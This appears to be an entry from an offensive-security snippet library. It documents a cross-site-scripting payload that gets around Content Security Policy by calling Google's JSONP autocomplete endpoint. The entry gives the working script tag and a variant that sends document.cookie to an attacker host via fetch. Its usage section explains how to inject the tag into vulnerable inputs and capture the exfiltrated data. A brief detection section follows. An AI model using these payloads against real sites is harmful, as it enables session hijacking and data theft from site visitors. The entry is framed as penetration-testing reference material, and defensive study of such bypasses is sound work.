---
id: ba659025-f0c1-4ad5-802e-f3c7babf6f2d
type: code
language: js
verified: true
created_at: '2023-04-06T03:56:43.190914+00:00'
updated_at: '2023-04-10T20:21:42.283770+00:00'
tags:
  - csp-bypass
  - xss
  - jsonp
platforms:
  - Web
validated: true
---

# JSONP-CSP-Bypass-Script-Tag

## Code

```js
<script src=//google.com/complete/search?client=chrome%26jsonp=alert(1);></script>
```

## Description

This JavaScript code snippet is a malicious script tag designed to bypass Content Security Policy (CSP) by loading a JSONP response from Google's autocomplete search API. The 'jsonp' parameter is set to 'alert(1)', which serves as a callback function that executes arbitrary JavaScript upon receiving the padded JSON response. It exploits whitelisted Google domains in CSP configurations to enable cross-site scripting (XSS) execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| jsonp=alert(1) | Callback function to execute; replace 'alert(1)' with custom JS like a data exfiltration function | jsonp=fetch('https://attacker.com?data='+document.cookie) |

## Usage

Inject this script tag into a vulnerable input field, URL parameter, or via an existing XSS vector on the target website. For manual testing, paste it into the browser's developer console (F12 > Console) while on the target page. Ensure a listener or monitoring tool is set up to capture any exfiltrated data if the payload is modified. This is typically used in web penetration testing to validate CSP bypasses.

## Detection

- Monitor for anomalous script loads from google.com/complete/search with suspicious 'jsonp' parameters in web logs or browser network tabs.
- CSP violation reports will not trigger if the domain is whitelisted, but WAF rules can flag JSONP callbacks containing executable code.
- Browser console errors or unexpected popups/alerts; network inspection showing cross-domain requests to Google APIs from non-search contexts.
- Use tools like OWASP ZAP or Burp Suite to detect injection attempts.

## Related

- [[procedures/CSP-Bypass-Using-JSONP-from-Google]]
